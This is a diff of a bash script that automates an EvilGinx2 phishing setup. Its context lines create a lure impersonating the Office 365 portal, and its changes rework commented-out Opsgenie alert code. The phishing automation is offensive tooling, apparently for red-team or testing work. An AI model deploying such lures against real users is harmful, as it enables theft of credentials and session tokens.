@@ -48,22 +48,41 @@ default_redirect=$(jq -r '.EvilGinx2.default_redirect' "$config_file")
 create_lure $default_phishlet $domain_name "https://portal.office.com"
 setup_evilginx
 
-# # Define your Opsgenie API key
+# send_opsgenie_alert() {
+#     # Parameters passed to the function
+#     local API_KEY="$1"
+#     local API_URL="$2"
+#     local HTML_CODE="$3"
+
+#     # Escape double quotes inside the HTML content
+#     local ESCAPED_HTML_CODE=$(echo "$HTML_CODE" | sed 's/"/\\"/g')
+
+#     # Define the alert payload parameters
+#     local MESSAGE="HTML Code Test Alert"
+#     local DESCRIPTION="Here is the HTML code:\n\n$ESCAPED_HTML_CODE"
+#     local ALIAS="html-code-test-001"
+#     local PRIORITY="P3"
+#     local USER="user@example.com"
+
+#     # Send the alert using curl
+#     local response=$(curl -s -X POST "$API_URL" \
+#       -H "Authorization: GenieKey $API_KEY" \
+#       -H "Content-Type: application/json" \
+#       -d '{
+#             "message": "'"$MESSAGE"'",
+#             "description": "'"$DESCRIPTION"'",
+#             "alias": "'"$ALIAS"'",
+#             "priority": "'"$PRIORITY"'",
+#             "user": "'"$USER"'"
+#           }')
+
+#     # Output the response from the API
+#     echo "Response: $response"
+# }
+
+# # Example usage of the function
 # API_KEY="YOUR_OPSGENIE_API_KEY"
+# API_URL="https://api.opsgenie.com/v2/alerts"
+# HTML_CODE="<html><body><h1>This is a test HTML code</h1></body></html>"
 
-
-# # Define the Opsgenie API endpoint for updating alerts
-# ALERT_ID="f47c229b-1234-5678-910a-bcdefghijklmn"  # Replace with actual alert ID
-# API_URL="https://api.opsgenie.com/v2/alerts/$ALERT_ID/close"
-
-# # Send the request to close the alert
-# response=$(curl -s -X POST "$API_URL" \
-#   -H "Authorization: GenieKey $API_KEY" \
-#   -H "Content-Type: application/json" \
-#   -d '{
-#         "user": "user@example.com",
-#         "note": "Closing the alert from Bash"
-#       }')
-
-# # Output the response from the API
-# echo "Response: $response"
+# send_opsgenie_alert "$API_KEY" "$API_URL" "$HTML_CODE"
